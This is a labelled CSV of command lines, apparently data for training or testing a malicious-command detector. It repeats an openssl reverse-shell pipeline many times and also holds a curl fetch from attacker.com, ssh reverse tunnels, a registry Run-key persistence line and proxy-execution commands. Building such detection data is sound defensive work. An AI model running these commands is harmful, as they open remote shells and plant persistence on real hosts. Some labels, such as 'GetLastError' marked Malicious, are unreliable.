command,label,original_label,mitre_id
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
"find . -type d | sed -e 's/^\.\///g' | awk '{print $1, $1}' | xargs chgrp",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9001,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:4445,Malicious,Synthetic,Synthetic
find [whatever] -exec cat {} \;,Benign,Benign,Benign
sudo iftop -b,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
prowler azure --az-cli-auth,Benign,Benign,Benign
declare -a variable=(item_a item_b item_c),Benign,Benign,Benign
ssh -R 8080:localhost:3389 root@example.com,Context_Dependent,Synthetic,Synthetic
cat index.html | pup 'div text{}',Benign,Benign,Benign
"ln -s ""../config/environments""",Benign,Benign,Benign
find . -type f -group sunk,Benign,Benign,Benign
openstack network delete network_id_or_name,Benign,Benign,Benign
ldapdomaindump [-u|--user] domain\username [-p|--password] password|ntlm_hash hostname|ip,Benign,Benign,Benign
airdecap-ng -e essid -p password path/to/capture.cap,Benign,Benign,Benign
takeown /a /f path\to\file,Benign,Benign,Benign
ssh -R 4444:localhost:22 backup@10.0.0.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:3389,Malicious,Synthetic,Synthetic
keepass2 path/to/database.kbdx -keyfile:path/to/key_file.key,Benign,Benign,Benign
qm [n|nbdstop] VM_ID,Benign,Benign,Benign
hr,Benign,Benign,Benign
mv /home/admin/healthcheck.sh.old /home/admin/healthcheck.sh,Benign,Synthetic,Synthetic
ssh -R 8080:localhost:9001 audit@192.168.0.5,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:445,Malicious,Synthetic,Synthetic
git tag --contains commit,Benign,Benign,Benign
todo show task_id,Benign,Benign,Benign
Get-ADGroupMember,Context_Dependent,Malicious,T1087
GetLastError,Malicious,Malicious,T1106
"find /var/log -name ""*.log"" -print0 2>/dev/null",Benign,Benign,Benign
alias mkcd='_(){ mkdir -pv $1; cd $1; }; _',Benign,Benign,Benign
netstat [-l|--listening],Context_Dependent,Benign,Benign
find . -name test -type d -exec rm -r {} \;,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:445 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
getfacl path/to/file_or_directory,Benign,Benign,Benign
xdotool getactivewindow,Benign,Benign,Benign
adb shell pm list packages -3,Benign,Benign,Benign
ssh -R 4444:localhost:143 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
swipl path/to/file.pl,Benign,Benign,Benign
pidof nginx,Benign,Synthetic,Synthetic
kubectl logs -f web-abc123,Benign,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
"find /home/pat -iname ""*.conf""",Context_Dependent,Benign,Benign
top -p 18884 -p 18892 -p 18919,Benign,Benign,Benign
ssh -R 4444:localhost:22 operator@10.0.0.5,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:80 jenkins@10.0.0.1,Context_Dependent,Synthetic,Synthetic
flyctl apps list,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:995,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:8443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
"cowsay -e characters ""hello, world""",Benign,Benign,Benign
curl http://attacker.com/path/to/input-file -o /path/to/output-file,Malicious,Malicious,T1105
openssl s_client -quiet -connect 192.168.0.50:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8443,Malicious,Synthetic,Synthetic
xcodes select xcode_version|path/to/Xcode.app,Benign,Benign,Benign
tail [-f|--follow] path/to/logfile | goaccess -,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:993,Malicious,Synthetic,Synthetic
lpoptions -d printer -l,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:22 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
mdp [-t|--notrans] presentation.md,Benign,Benign,Benign
papermc start,Benign,Benign,Benign
cockpit-ws --address ip_address,Benign,Benign,Benign
cargo rustdoc -- --allow rustdoc::lint_name,Benign,Benign,Benign
cryptcat -k password -w timeout_in_seconds ip_address port,Benign,Benign,Benign
"asterisk -r -x ""sip show peers""",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
"pnmconvol -matrix=-1,3,-1 -normalize path/to/image.pnm > path/to/output.pnm",Benign,Benign,Benign
pcdovtoppm [-f|-font] font [-w|-white] path/to/file.pcd > path/to/output.ppm,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:143,Malicious,Synthetic,Synthetic
tldr DumpNTLMInfo.py,Benign,Benign,Benign
head -50 /etc/mysql/my.cnf,Benign,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9001,Malicious,Synthetic,Synthetic
hexedit path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:110 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:445 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
tidy path/to/file.html,Benign,Benign,Benign
echo 'some_file_name' | cpio -p --owner someuser:somegroup destination_directory,Benign,Benign,Benign
acpi [-V|--everything],Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8443,Malicious,Synthetic,Synthetic
jdupes directory1 directory2 ...,Benign,Benign,Benign
github-label-sync --access-token token --dry-run repository_name,Benign,Benign,Benign
ssh -R 4444:localhost:1433 user@10.0.0.100,Context_Dependent,Synthetic,Synthetic
"set lastdaymonth=`cal $month $year |tr -s "" "" ""\n""|tail -1`",Benign,Benign,Benign
join -a 2 /dev/null /path/to/input-file,Context_Dependent,Malicious,T1005
openssl s_client -quiet -connect 172.16.0.10:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
udiskie --config path/to/config.yml,Benign,Benign,Benign
pnmscalefixed [-w|-width] width [-h|-height] height path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
"find . -type f -name ""*.jpg"" -print0 | xargs -0 rename ""s/Image_200x200_(\d{3})/img/""",Benign,Benign,Benign
cradle deploy s3,Benign,Benign,Benign
lsscsi,Benign,Benign,Benign
torify -P proxy command,Benign,Benign,Benign
C:\Windows\System32\DisplaySwitch.exe,Malicious,Malicious,T1546
boot --dependencies boot/new new --template template_name --name project_name,Benign,Benign,Benign
IActiveScriptParseProcedure32,Context_Dependent,Malicious,T1012
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8443,Malicious,Synthetic,Synthetic
tldr kiterunner wordlist,Benign,Benign,Benign
net user $guest_user $guest_password,Malicious,Malicious,T1078
ssh -R 8080:localhost:80 operator@192.168.0.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
py-spy top [-p|--pid] pid,Benign,Benign,Benign
docker [rm|container rm] [-v|--volumes] container,Benign,Benign,Benign
ssh -R 8080:localhost:22 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
apkleaks [-f|--file] path/to/file.apk [-o|--output] path/to/output.txt,Benign,Benign,Benign
resend login,Benign,Benign,Benign
snowsql --config path/to/configuration_file,Benign,Benign,Benign
find /tmp -depth -name core -type f -delete,Benign,Benign,Benign
sudo airodump-ng --channel channel --write path/to/file --bssid mac interface,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:80,Malicious,Synthetic,Synthetic
tldr xzcmp,Benign,Benign,Benign
macptopbm path/to/file.macp > path/to/output.pbm,Benign,Benign,Benign
systemd-analyze dot | dot -T svg > path/to/file.svg,Benign,Benign,Benign
systemsettings [-h|--help],Benign,Benign,Benign
paste -sd+ infile | bc,Benign,Benign,Benign
plasma-apply-wallpaperimage --help,Benign,Benign,Benign
strip-nondeterminism --timestamp unix_timestamp path/to/file,Benign,Benign,Benign
"find /var/log/apache2/access*.gz -type f -newer ./tmpoldfile ! -newer ./tmpnewfile \ | xargs zcat | grep -E ""$MONTH\/$YEAR.*GET.*ad=$ADVERTISER HTTP\/1"" -c",Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:5432 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
rekor-cli upload --artifact path/to/file.ext --signature path/to/file.ext.sig --pki-format=x509 --public-key=path/to/key.pub,Benign,Benign,Benign
dir c:\ >> %temp%\download,Context_Dependent,Malicious,T1083
choco install path\to\packages_file.config,Benign,Benign,Benign
ssh -R 4444:localhost:9001 svcuser@10.0.0.100,Context_Dependent,Synthetic,Synthetic
sudo chown root /tmp/hello,Malicious,Malicious,T1548
chezmoi re-add path/to/dotfile1 path/to/dotfile2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
find /path/to/look/in/ -type d -name '.texturedata',Benign,Benign,Benign
"let ""result = (x > 10) ? x : 0""",Benign,Benign,Benign
hledger-ui --info,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:22,Malicious,Synthetic,Synthetic
cargo fmt --check,Benign,Benign,Benign
vkpurge list version,Benign,Benign,Benign
apt-clone clone --destination path/to/backup.tar.gz,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
darling shell path/to/program program_argument_1 program_argument_2 ...,Benign,Benign,Benign
pnmtofiasco [-f|--config] path/to/fiascorc path/to/file.pnm > path/to/file.fiasco,Benign,Benign,Benign
fonttools subset path/to/font.ttf --unicodes=U+0000-007F,Benign,Benign,Benign
opusenc path/to/input.wav --downmix-mono --bitrate 6 path/to/out.opus,Benign,Benign,Benign
Dll,Malicious,Malicious,T1553
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9090,Malicious,Synthetic,Synthetic
add py script.py;,Benign,Benign,Benign
koji buildinfo BuildID_or_NVR1 BuildID_or_NRV2 ... --changelog,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8443,Malicious,Synthetic,Synthetic
microsoft-edge --auto-open-devtools-for-tabs,Benign,Benign,Benign
aws s3 rm s3://bucket_name/path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:9001,Malicious,Synthetic,Synthetic
blkpr [-c|--command] preempt [-K|--oldkey] old_key [-k|--key] new_key [-t|--type] write-exclusive path/to/device,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
wall [-t|--timeout] seconds file,Benign,Benign,Benign
pdftex -output-directory=path/to/directory source.tex,Benign,Benign,Benign
sudo genkernel bzImage|initramfs|kernel|ramdisk,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:1433 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:22 jenkins@172.20.10.8,Context_Dependent,Synthetic,Synthetic
linode-cli linodes delete linode_id,Benign,Benign,Benign
find . -perm 644 -type f -exec ls -l {} \;,Benign,Benign,Benign
lsof -u username,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:110,Malicious,Synthetic,Synthetic
"ping google.com -n 10 | awk '/Minimum =/ { sub("","","""",$3); print $3 }'",Benign,Benign,Benign
adduser username,Benign,Benign,Benign
sed 'x;G;1!h;s/\n/ /g;$!d',Benign,Benign,Benign
systemd-tmpfiles --create,Benign,Benign,Benign
tttracer.exe {PATH_ABSOLUTE:.exe},Malicious,Malicious,T1127
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:110,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:80 user@10.0.0.1,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:22 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:445,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:3306 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
cewl --proxy_host host --proxy_port port url,Benign,Benign,Benign
"todoist [a|add] ""task_name"" --priority 1 --label-ids ""label_id"" --project-name ""project_name"" --date ""tmr 9am""",Benign,Benign,Benign
"rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}",Malicious,Malicious,T1218
public class Test {,Malicious,Malicious,T1036
"kdeconnect-cli --ring --name ""device_name""",Benign,Benign,Benign
zoxide init bash|elvish|fish|nushell|posix|powershell|tcsh|xonsh|zsh,Benign,Benign,Benign
swaks [-t|--to] user@example.com [-s|--server] test-server.example.net,Benign,Benign,Benign
kodi-send --host 192.168.0.1 --port 9777 [-a|--action] Quit,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:3389 user@10.0.0.8,Context_Dependent,Synthetic,Synthetic
jhead -ft path/to/image.jpg,Benign,Benign,Benign
gzip -d file.gz,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9090 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
exa [-r|--reverse] [-s|--sort] size,Benign,Benign,Benign
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f",Malicious,Malicious,T1112
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:995,Malicious,Synthetic,Synthetic
esbuild --bundle path/to/file.js,Benign,Benign,Benign
ssh -R 8080:localhost:22 jenkins@172.16.5.20,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:6379,Malicious,Synthetic,Synthetic
toolbox rm container_name,Benign,Benign,Benign
if (!$Computer) { Continue },Context_Dependent,Malicious,T1018
find /Users/Me/Desktop -user popo -perm 777,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8080,Malicious,Synthetic,Synthetic
ZwSetValueKey(),Malicious,Malicious,T1543
shopt -s expand_aliases,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
hg pull path/to/source_repository,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
sudo bclm unpersist,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""$target_key_value_name"" -Value ""$payload""",Malicious,Malicious,T1547
